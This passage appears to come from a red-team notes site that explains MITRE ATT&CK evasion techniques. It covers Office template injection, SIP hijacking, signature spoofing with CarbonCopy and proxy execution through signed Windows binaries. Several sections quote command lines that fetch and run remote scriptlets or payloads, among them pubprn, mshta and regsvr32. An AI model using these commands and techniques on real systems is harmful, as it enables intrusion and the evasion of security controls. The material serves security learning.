![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_ycLdQbTW4r85oYQ%2F-MRka4hqMFA6jaa4d7fW%2Fimage.png?alt=media&token=60b251aa-6af3-4b82-af4e-75fb9bd2be88)

But from Procmon we also see the files it calls and the Connections that are being made

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_ycLdQbTW4r85oYQ%2F-MRka5P2kHN_ibIrdRmt%2Fimage.png?alt=media&token=3482e1e2-4d4a-4ebf-abc4-9e742c1c8f1e)

One of the good things of MSBuild is that it cleans after the connection is closed.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_ycLdQbTW4r85oYQ%2F-MRka65be3ft9jUA-kW5%2Fimage.png?alt=media&token=f3bb4b79-292c-4021-bbba-f95adf76d879)

This is good for OPSEC but still be aware that a file still is created and touches Disk, TEMP file but still some forensic evidence.

**Demo**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRka6atPtn5v5uvILKH%2F-MRka8QnANdt2po-nrfF%2FProxy-Execution-MSBUILD.gif?alt=media&token=0b526666-624a-46c9-ab45-625b881403d6)

## t1221-template-injection

Adversaries may create or modify references in Office document templates to conceal malicious code or force authentication attempts. Microsoft's Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, .xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.

Properties within parts may reference shared public resources access via online URLs. For example, template properties reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.

Adversaries mat abuse this technology to initially conceal malicious code to be executed via documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded. These documents can be delivered via other techniques such as Phishing and/or Taint Shared Content and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched. Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.

This technique may also enable Forced Authentication by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.

**Example**

For this Demo we now create a docs file that will try and reach out to our attacking machine from a remote source. The easiest way to do this is to create a doc document from one of the provided Word templates, and just modify the target.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_ehulnUX5EhF6B4_%2Fimage.png?alt=media&token=468cf284-2fdd-48b3-afc1-4b36ad7ac2b9)

Now we will just need to modify the document to accommodate it to our phishing needs, with the release of Office 2007, Microsoft introduced formats that end with the 'x' character, each of these formats are just zip files containing mostly .xml and .rel files. We are going to manually edit these properly and then zip them back together.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_fY5qClQ0xMbl0i1%2Fimage.png?alt=media&token=bbde7fb1-265c-4324-8861-28153ce1b2df)

Once unzip we will navigate to the word >> _rels >> settings.xml file and search for the Target value.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_gVCaqTsqy1suu-w%2Fimage.png?alt=media&token=e972eb39-cd42-4413-aed1-1d92fcc0e8f3)

We edit it to point to our remote host.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_hMe2OZxegbT-ve4%2Fimage.png?alt=media&token=0ebb8dbe-8dfd-40fd-b494-bb76ab74e423)

Once the file is being loaded you will notice it's trying to reach out to our Remote Host

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_i4LEAI1fnQimGew%2Fimage.png?alt=media&token=b7903b68-54f8-4ee3-bcea-9ee6407b90fd)

I set responder to be listening for any traffic

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_irodsFOIvSzxLnG%2Fimage.png?alt=media&token=c6f38f3c-69fa-45a9-9b63-05b023326679)

**Note:**

**OK so I was trying to Unzip the files but was getting errors that the file was damaged, so to get around this all I did was drag and drop the payload to the normal file just to replace the document, instead of unzipping the file all I did was rename it to ZIP so I can access the XML files**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_cnv4zdeEgqVrL90%2F-MRk_jhWOiU1Kzdn0S-T%2Fimage.png?alt=media&token=99e9a7a4-bf01-49ad-a840-4116cef8fc60)

**In the upper image I just dragged and dropped the upper file to the bottom window and renamed it back to docx WITHOUT the unzipping**

**Demo:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRka6atPtn5v5uvILKH%2F-MRkaFarz2qnJPKtlnAI%2FProxy-Execution-Template-Injection.gif?alt=media&token=181aec0e-cf3e-47c3-b48e-bf71f9289fc9)

References:

Executing Macros From a DOCX With Remote Template Injection

Playing defense against Gamaredon Group

Elastic Blog

Attack on Critical Infrastructure Leverages Template Injection

​

## t1553-subvert-trust-controls

Adversaries may undermine security controls that will either warn users of untrusted activity or prevent execution of untrusted programs. Operating systems and security products may contain mechanisms to identify programs or websites as possessing some level of trust. Examples of such features would include a program being allowed to run because it is signed by a valid code signing certificate, a program prompting the user with a warning because it has an attribute set from being downloaded from the Internet, or getting an indication that you are about to connect to an untrusted site.

Adversaries may attempt to subvert these trust mechanisms. The method adversaries use will depends on the specific mechanism they seek to subvert. Adversaries may conduct File and Directory Permissions Modification or Modify Registry in support of subverting these controls. Adversaries may also create or steal code signing certificates to acquire trust on target systems.

### sip-and-trust-provider-hijacking

Adversaries may tamper with SIP and trust provider components to mislead the operating system and application controls tools when conducting signature validation checks. In user mode, Windows Authenticode digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as asfe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature.

Becausse of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) to provide a layer of abstraction between API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing  a catch-all) and are identified by globally unique identifiers (GUIDs).

Similar to Code Signing, adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimate signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and application control tool to classify malicious (or any) code as signed by:

·         Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[\WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg{{SIP_GUID}} that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP 

[[6]](https://github.com/mattifestation/PoCSubjectInterfacePackage)

[6]

 (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file).

·         Modifying the Dll and FuncName Registry values in HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData{{SIP_GUID}} that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP 

 (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk.

·         Modifying the DLL and Function Registry values in HKLM\SOFTWARE[WOW6432Node]Microsoft\Cryptography\Providers\Trust\FinalPolicy{{trust provider GUID}} that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex).

·         

**Note:**

Note:

 The above hijacks are also possible without modifying the Registry via 

DLL Search Order Hijacking

[DLL Search Order Hijacking](https://github.com/mattifestation/PoCSubjectInterfacePackage)

.

Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation.

### code-signing

Adversaries may create, acquire, or steal code signing materials to sign their malware or tools. Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. The certificate used during an operation may be created, acquired, or stolen by the adversary. Unlike Invalid Code Signature, this activity will result in a valid signature.

Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform.

Code signing certificates may be used to bypass security policies that require signed code to execute on a system.

**Example**

CarbonCopy a tool built by paranoidninja for spoofing Digital Signatures, signatures like these can actually bypass AV and pass undetected by analysts because they provide a level of authenticity. See 2 payloads with and without a Digital Signature.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_6lzWPJdaAbaG40W%2F-MRk_BHX3KDg5gvpoJd4%2Fimage.png?alt=media&token=245fdd22-118a-4bd4-bb65-29d5a9e5baab)

Now will check out the digitally signed one a little more to check what it contains.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_6lzWPJdaAbaG40W%2F-MRk_C59zjEh4_dFRsR4%2Fimage.png?alt=media&token=157e0f22-3824-4880-9478-10580baf0824)

A Digital Signature not installed of course this is why we see that it cannot be verified.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_6lzWPJdaAbaG40W%2F-MRk_D4Cr5d1g-en81Qc%2Fimage.png?alt=media&token=d620957c-12c6-41a5-b6e3-209aff426b52)

We have the option to install this certificate of course with proper permissions but here I am just trying to demonstrate how this "Signature" can provide some level of authenticity since it is Signed by Microsoft, of course a solid analyst can see that this has been valid from a recent Date. So how can we build this digitally signed binary, with CarbonCopy.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRk_6lzWPJdaAbaG40W%2F-MRk_E1FwzTPBxa9lk_c%2Fimage.png?alt=media&token=91da7fc9-c605-4102-bc1f-7039c177e41f)

Above we see a successful spoofed Signature the requirements for this is very simple the website we are trying to spoof its signature the port the target payload and an output file.

**You will also need OSSLSignedCode tool to be installed.**

References:

Masquerading as a Windows System Binary Using Digital Signatures

F-Secure Labs

​

## t1216-signed-script-proxy-execution

Adversaries may use the trusted PubPrn script to proxy execution of malicious files. This behavior may bypass signature validation restrictions and application control solutions that do not account for use of these scripts.

PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script is signed by Microsoft and can be used to proxy execution from a remote site. An example commands is

**cscript C[:]\Windows\System32\Printing_Admin_Scripts\en-US\pubprn[.]vbs 127.0.0.1 script:http[:]//192.168.1.100/hi.png**

**Example**

**Could not Replicate, I wasn't receiving errors and could find the payload I was pointing at if any suggestions**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkZogn5EgZaLEyBXmL%2F-MRkZozfvzZ8uab76P1w%2Fimage.png?alt=media&token=72c473bd-23d3-4e8e-8b0b-33f8dd0d73c5)

References:

WSH Injection: A Case Study

enigma0x3

​

windows-operating-system-archaeology/pubprn_injection.txt at master · enigma0x3/windows-operating-system-archaeology

GitHub

pubprn
            
            |
            
            LOLBAS

## t1218-signed-binary-proxy-execution

Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed binaries. Binaries signed with trusted digital certificates can execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files.

### untitled-10

Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such as VBA, Jscript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe).

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application  control on older and/or unpatched systems that do not account for execution of binaries through hh.exe

**Example**

 In this Demo a simple CHM file created and being executed, I have added references to manually and automatically create these payloads

Will use the Out-CHM to create the payload, by adding the payload parameter where it is located and the hh.exe utility for it to compile it in a format capable for hh.exe in understanding

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkBm8aGoEY4__kfDJJ%2F-MRkXQLwt1bawbfqhgHL%2Fimage.png?alt=media&token=078006fe-a2f6-4a9a-a470-ef8cf3c802d8)

Once this is done, execution is simple.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkBm8aGoEY4__kfDJJ%2F-MRkXSU0sEjD7L3nlr4Z%2Fimage.png?alt=media&token=308549bd-f732-4568-96ab-754bfcb7a5b4)

References:

​

[https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7](https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7)

https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7

https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1

[https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1](https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7)

### untitled-9

Adversaries may abuse control.exe to proxy execution of malicious payloads. The Windows Control Panel process binary (control.exe) handles execution of Control Panel items, which are utilities that allow users to view and adjust computer settings.

Control Panel items are registered executable (.exe) or Control Panel (.cpl) files, that latter are actually renamed dynamic-link library (.dll) files that export a CPApplet function. For ease of use, Control Panel items typically include graphical menus available to users after being registered and loaded into the Control Panel. Control Panel items can be executed directly from the command line, programmatically via an application programming interface (API) call, or by simply double-clicking the file.

Malicious Control Panel items can be delivered via Phishing campaigns or executed as part of multi-stage malware. Control Panel items, specifically CPL files, may also bypass application and/or file extension allow lists.

Adversaries may also rename malicious DLL files (.dll) with Control Panel extensions  (.cpl) and register them to HKCU\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls. Even when these registered DLLs do not comply with the CPL file specifications and do not export CPApplet functions, they are loaded and executed through its DllEntryPoint when Control Panel is executed. CPL files not exporting CPApplet are not directly executable.

**Example**

In this demo we will compile code to create a functional cpl file format, this is not necessary as these can also be exe format but in this occasion we are using this for demo purposes but also to demonstrate the different type of executable formats.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkX_5bf8lmdrI3_MiE%2F-MRkXfy4Gx8rCB1y5Dix%2Fimage.png?alt=media&token=44e9bdb4-3b32-4668-8c64-31418fc43f10)

Once compile we can execute with a double-click on the file or simply using control.exe, you will need to add the full path of the payload.

**Demo**

References:

​

[https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)

https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/

https://lolbas-project.github.io/lolbas/Binaries/Control/

[https://lolbas-project.github.io/lolbas/Binaries/Control/](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)

### untitled-8

Adversaries may abuse CMSTP to proxy execution of malicious code. The Microsoft Connection Manager Profile Installer (CMTSP.exe) is command-line program used to install Connection Manager service profiles. CMSTP.exe accepts an installation information file (INF) as a parameter and installs a service profile leveraged for remote  access connections.

Adversaries may supply CMSTP.exe with INF files infected with malicious commands. Similar to Regsvr32 / "Squiblydoo", CMSTP.exe may abused to load and execute DLLs and/or COM scriptlets (SCT) from remote servers. This execution may also bypass AppLocker and other application control defenses since CMSTP.exe is a legitimate, signed Microsoft application.

CMSTP.exe can also be abused to Bypass User Account Control and execute arbitrary commands from a malicious INF through an auto-elevated COM interface.

**Example**

This one was a little tricky as we needed to create an inf file but also have an sct file waiting for us remotely to execute code, as this will use the scrobj.dll to execute our code as well.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXlpyeiPnNyt1vi75%2F-MRkXmlkFXW2YGvgRlHW%2Fimage.png?alt=media&token=27fe23c0-b3f7-4d79-a1ff-8c955fe70871)

Then execution should be simple

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXlpyeiPnNyt1vi75%2F-MRkXn_YqKV5JozbzlFg%2Fimage.png?alt=media&token=07e87b86-ea37-4b1d-8b7f-6c767e502223)

Careful as this will create a VPN Connection and leave a shortcut on the Desktop as well, a way to avoid this is to actually gain a shell (PowerShell, CMD) in this demo the reason (I think?) it is being left behind is because execution finalizes and doesn't stay in a continuous running state such as when receiving a shell

References:

​

[https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)

https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf

https://www.contextis.com/en/blog/applocker-bypass-via-registry-key-manipulation

[https://www.contextis.com/en/blog/applocker-bypass-via-registry-key-manipulation](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)

https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/

[https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)

https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80

[https://gist.github.com/NickTyrer/bbd10d20a5bb78f64a9d13f399ea0f80](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)

https://twitter.com/NickTyrer/status/958450014111633408

[https://twitter.com/NickTyrer/status/958450014111633408](https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf)

### untitled-7

Adversaries may use InstallUtil to proxy execution of code through a trusted Windows utility. Installutil is a command-line utility that allows for installation and uninstallation of resources by executing specific installer components specified in .NET binaries. InstallUtil is digitally signed by Microsoft and located in the .NET directories on a Windows system C:\Windows\Microsoft.NET\Framework\v\InstallUtil.exe and C:\Windows\Microsoft.NET\Framewrok64\v\installUtil.exe

InstallUtil amy also be used to bypass application control through use of attributes within the binary that execute the class decorated with the attribute [System.ComponentModel.RunInstaller(true)].

**Example**

In the following example I created a C# binary that will execute calc after looking at some examples (penteslab) mainly it says that it will execute binaries in C# code, so by this I compiled it and use IntallUtil to execute the binary itself

This seems to be true if you don't compile it correctly

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXo9bYjZTkug_Y2Bv%2F-MRkXuFZ43FvU_Oucl06%2Fimage.png?alt=media&token=9fdabe6c-17f0-49fa-a7a9-f920e6d21581)

Demo

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXo9bYjZTkug_Y2Bv%2F-MRkXuuUKqyn_-N94cil%2Fimage.png?alt=media&token=4829aa1d-3dd7-4e79-b7b0-f28ce7ee9ace)

References:

​

[https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/](https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/)

### untitled-6

Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and JavaScript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code.

Mshta.exe is a utility that executes Microsoft HTML Application (HTA)files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.

Files may be executed by mshta.exe through an inline script:mshta vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")"))

They may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta

Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings.

**Example**

I wrote a simple Python Script which will create easy HTA applications that will execute a simple PowerShell command this one was slightly edited to execute calc.exe

The following Demo demonstrates the execution and Process Explorer running for seeing the flow of execution, with the result of opening calc.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXo9bYjZTkug_Y2Bv%2F-MRkY-Z0pW_jXZp9zDmQ%2Fimage.png?alt=media&token=167ae7a4-b98d-48a7-aeba-5d3789bf720c)

**Demo-HTA:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkXo9bYjZTkug_Y2Bv%2F-MRkY3bqNsiK0jnuBduZ%2FProxy-Execution-HTA-File.gif?alt=media&token=ed8690c2-0660-4dcf-a0ff-1b952464c08b)

### untitled-5

Adversaries may abuse msiexec.exe to proxy execution of malicious payloads. Msiexec.exe is the command-line utility for the Windows Installer and is thus commonly associated with executing installation packages (.msi). Msiexec.exe is digitally signed by Microsoft.

Adversaries may abuse msiexec.exe to launch local or network accessible MSI files. Msiexec.exe can also execute DLLs. Since it is signed and native on Windows systems, msiexec.exe can be used to bypass application control solutions that do not account for its potential abuse.

**Example**

In the following Demo a simple MSI payload (DLL) was created and used MSIexec for execution will see the flow of execution by using Process Explorer. MSIexec is capable of running dll payloads for the DLLRegisterServer parameter available in the utility[ 

**/z & /y**

].

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkY4pIB9XdQNKfkE1k%2F-MRkYC8kznzby6NbXgNc%2Fimage.png?alt=media&token=51d6ba4b-7532-4773-8f7c-e90dbc09871b)

**DEMO-MSIEXEC:**

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkY4pIB9XdQNKfkE1k%2F-MRkYHv0kJZa0AYGcfoF%2FProxy-Execution-MSIEXEC.gif?alt=media&token=1a610c43-a05c-401c-b398-17a238eff88c)

References:

​

[https://lolbas-project.github.io/lolbas/Binaries/Msiexec/](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

### untitled-4

Adversaries may abuse odbcconf.exe to proxy execution of malicious payloads. Odbcconf.exe is a Windows utility that allows you to configure Open Database Connectivity (ODBC) drivers and data source names. Odbcconf.exe is digitally signed by Microsoft.

Adversaries may abuse odbcconf.exe to bypass application control solutions that do not account for its potential abuse. Similar to Regsvr32, odbcconf.exe has a REGSVR flag that can be misused to execute DLLs (ex: odbcconf.exe /S /A {REGSVR "C:\Users\Public\file.dll"}).

**Example**

With this example just by simple using the command-line payloads offered on MITRE we get proper execution.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYJOaYqP1MTpXbWbc%2F-MRkYR5DrTv2MuG4djbi%2Fimage.png?alt=media&token=b267f2ee-08e1-4be9-aeb5-1fc6e0ddf475)

Process Explorer

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYJOaYqP1MTpXbWbc%2F-MRkYRoeafEKGqvDbeQf%2Fimage.png?alt=media&token=857c16bb-1af3-4fb1-8b11-eafd97e5b4be)

It is also demonstrated that we can execute 

**rsp**

rsp

 payloads, the file will contain the REGSVR parameter and the file we are executing in this sample the directory of the payloads is located in the same working directory as the file

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYJOaYqP1MTpXbWbc%2F-MRkYSctDJ-UKJMQJ7m_%2Fimage.png?alt=media&token=5dd5c5e8-8947-47f4-9cc3-050214f38692)

Demo

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYJOaYqP1MTpXbWbc%2F-MRkYT_qfUBayz3KgzmV%2Fimage.png?alt=media&token=f5517d6b-0f98-4ced-ba5f-820040a9a231)

References:

​

[https://github.com/woanware/application-restriction-bypasses](https://github.com/woanware/application-restriction-bypasses)

https://github.com/woanware/application-restriction-bypasses

https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b

[https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b](https://github.com/woanware/application-restriction-bypasses)

https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/

[https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/](https://github.com/woanware/application-restriction-bypasses)

### untitled-3

Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.

Both utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration:

[ComRegisterFunction] or [ComUnregisterFunction] respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.

**I used the following instruction to make this payload work**

​

[https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs](https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs)

https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs

After compiling and configuring the proper steps to create my payload and have it execute text in console

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYdI4RI_OvojZJp3D%2F-MRkYmXoqZM4v8Jr5TP_%2Fimage.png?alt=media&token=ad4b23fe-4ab9-4047-add4-9d5107866e70)

References:

https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/

[https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/](https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs)

https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/

[https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/](https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs)

https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md

[https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1121/T1121.md](https://gist.githubusercontent.com/Arno0x/71ea3afb412ec1a5490c657e58449182/raw/b7226931b70eb04bc5efee51b4f2df0b6fe3c483/regasm.cs)

### untitled-2

Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary.

Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allow lists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web Server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. This variation of the technique  is often referred to as "Squiblydoo" attack and has been used in campaigns targeting governments.

Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via Component Object Model Hijacking.

**Example:**

By creating an sct file by using the scriptlet provided by pentesterlab it's slightly edited to execute calc.exe

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRkYsMT_--86drnHom5%2F-MRkYtUKKstCp-Pyz9TR%2Fimage.png?alt=media&token=620c6f1e-e151-47a6-ae7b-241df932b9ed)

The execution type on this one is locally, regsvr32 is proxy aware so execution can also be done from remote hosts.

